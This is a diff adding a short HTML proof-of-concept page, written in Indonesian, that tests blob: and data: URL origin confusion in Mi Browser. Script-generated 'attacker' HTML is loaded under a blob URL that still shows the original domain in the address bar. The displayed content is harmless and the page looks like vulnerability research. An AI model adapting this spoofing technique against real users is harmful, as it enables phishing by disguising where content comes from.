@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PoC blob: origin confusion</title>
+</head>
+<body style="font-family:sans-serif; padding:16px">
+<h3>PoC 1: blob: URL Origin Confusion</h3>
+<p>Test ini untuk Mi Browser. Klik tombol di bawah:</p>
+
+<button id="btn" style="padding:14px; width:100%; font-size:16px">1. Buka blob URL</button>
+
+<pre id="log" style="background:#111; color:#0f0; padding:10px; margin-top:12px; white-space:pre-wrap">Log: siap
+- Alamat awal: akan keliatan bonex1927.github.io
+- Setelah klik: alamat jadi blob:https://bonex1927.github.io/...
+- Isi halaman jadi dari blob, bukan dari server asli
+</pre>
+
+<script>
+const log = (m) => {
+  document.getElementById('log').textContent += "\n" + m;
+}
+
+document.getElementById('btn').onclick = () => {
+  // Konten yang sepenuhnya dikontrol attacker, tapi origin-nya masih kebawa domain asli
+  const attackerContent = `
+    <html><body style="font-family:sans-serif;padding:20px">
+    <h2>Ini adalah konten dari BLOB</h2>
+    <p>Alamat di address bar masih ada unsur bonex1927.github.io, tapi konten ini bukan dari server, melainkan dari blob yang dibuat via JavaScript.</p>
+    <p>Di sinilah celah confusion terjadi. User bisa mengira masih di halaman asli.</p>
+    <p>Timestamp: ${new Date().toString()}</p>
+    </body></html>
+  `;
+
+  const blob = new Blob([attackerContent], {type: 'text/html'});
+  const blobUrl = URL.createObjectURL(blob);
+
+  log("Membuka: " + blobUrl);
+  // Navigasi ke blob URL
+  location.href = blobUrl;
+}
+</script>
+
+<p style="margin-top:20px">Versi data: URI (alternatif test):</p>
+<button onclick="location.href='data:text/html,[STRIPPED]Ini dari data URI</h1><p>Address bar jadi data:[STRIPPED] yang membingungkan</p>'" style="padding:12px; width:100%">2. Test data: URI</button>
+
+</body>
+</html>
